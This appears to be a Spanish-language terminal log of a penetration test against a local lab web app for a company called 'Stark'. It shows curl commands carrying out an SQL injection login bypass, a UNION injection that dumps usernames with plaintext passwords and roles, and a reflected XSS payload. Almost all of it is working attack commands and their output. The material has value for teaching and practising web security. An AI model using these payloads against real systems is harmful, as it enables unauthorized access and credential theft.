# SQLi: evasión de autenticación (usuario = ana.ti' --)

$ curl -s -c /tmp/stark_j.txt -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' --data-urlencode "username=ana.ti' --" --data-urlencode 'password=x' http://127.0.0.1:5050/login
HTTP 302 -> http://127.0.0.1:5050/dashboard

$ curl -s -b /tmp/stark_j.txt http://127.0.0.1:5050/dashboard | grep -o 'Bienvenido(a), [^<]*'
Bienvenido(a), Ana Torres

$ curl -s -c /tmp/stark_j.txt -o /dev/null -d 'username=sofia.consulta&password=Consulta*26' http://127.0.0.1:5050/login

# SQLi: UNION en /buscar

$ curl -s -b /tmp/stark_j.txt -G --data-urlencode "q=zzz' UNION SELECT username, password, rol FROM usuarios --" http://127.0.0.1:5050/buscar | grep -o '<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td></tr>'
<tr><td>ana.ti</td><td>TI#Stark2026</td><td>stark_ti</td></tr>
<tr><td>luis.oper</td><td>Turno1!2026</td><td>stark_oper</td></tr>
<tr><td>mgarza.rh</td><td>RH-Garza-26</td><td>stark_consulta</td></tr>
<tr><td>sofia.consulta</td><td>Consulta*26</td><td>stark_consulta</td></tr>

# XSS reflejado: el payload aparece sin escapar en el HTML

$ curl -s -b /tmp/stark_j.txt -G --data-urlencode "q=<script>alert('XSS-Stark')</script>" http://127.0.0.1:5050/buscar | grep -n 'Resultados para'
40:  <p>Resultados para: <b><script>alert('XSS-Stark')</script></b></p>
